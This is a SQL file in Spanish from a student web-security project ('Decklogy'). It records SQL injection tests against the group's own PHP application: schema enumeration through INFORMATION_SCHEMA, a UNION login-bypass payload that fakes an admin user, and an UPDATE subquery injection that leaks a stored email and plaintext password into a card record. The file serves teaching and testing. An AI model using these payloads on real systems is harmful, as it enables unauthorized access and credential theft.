-- PROYECTO: DECKLOGY - SEGURIDAD EN APLICACIONES WEB
-- GRUPO: 4
-- DESCRIPCIÓN: Pruebas de vulnerabilidad y extracción de datos

-- ============================================================================
-- 1. INFORMATION_SCHEMA
-- ============================================================================

-- Prueba 1: Identificación de las tablas del esquema
SELECT TABLE_NAME 
FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_SCHEMA = 'decklogy';

-- Prueba 2: Análisis de la estructura de la tabla usuarios
-- El objetivo es identificar las columnas de credenciales (nombre, contrasena, rol)
SELECT COLUMN_NAME, DATA_TYPE
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE TABLE_NAME = 'usuarios' 
AND TABLE_SCHEMA = 'decklogy';


-- ============================================================================
-- 3. ATAQUES DE LOGIN (BYPASS DE AUTENTICACIÓN)
-- ============================================================================

-- Objetivo: Entrar al sistema sin conocer contraseñas reales.
-- Técnica: Inyección UNION para crear un usuario falso en memoria aceptado por el PHP.
-- Input Email: '' UNION SELECT 1, 'Hacker', '123', 'hacker@mail.com', 'admin', '0' #
-- Input Password: 123

SELECT * FROM usuarios 
WHERE email = '' UNION SELECT 1, 'Hacker', '123', 'hacker@mail.com', 'admin', '0' #';
'
-- ============================================================================
-- 4. EXTRACCIÓN MASIVA DE CREDENCIALES (MODIFICACIÓN DE CARTAS)
-- ============================================================================

-- Objetivo: Robar email y contraseña del administrador desde el formulario de cartas.
-- Técnica: Sobreescritura de campos mediante subconsultas en UPDATE.
-- Inyectado en el campo 'curacion': 
-- 25 , nombre = (SELECT email FROM usuarios LIMIT 1), descripcion = (SELECT contrasena FROM usuarios LIMIT 1)

UPDATE cartas 
SET nombre = 'Filtros Naturales', 
    descripcion = 'Plantas de ribera que limpian el agua.', 
    curacion = 25 , 
    nombre = (SELECT email FROM usuarios LIMIT 1), 
    descripcion = (SELECT contrasena FROM usuarios LIMIT 1), 
    id_zona = 1, 
    elimina_id_evento = 3, 
    id_icono = 13 
WHERE id_carta = 3;

-- Tras ejecutar esta consulta, el nombre de la carta será 'kiko@gmail.com' 
-- y su descripción será '1234' ( la contraseña almacenada).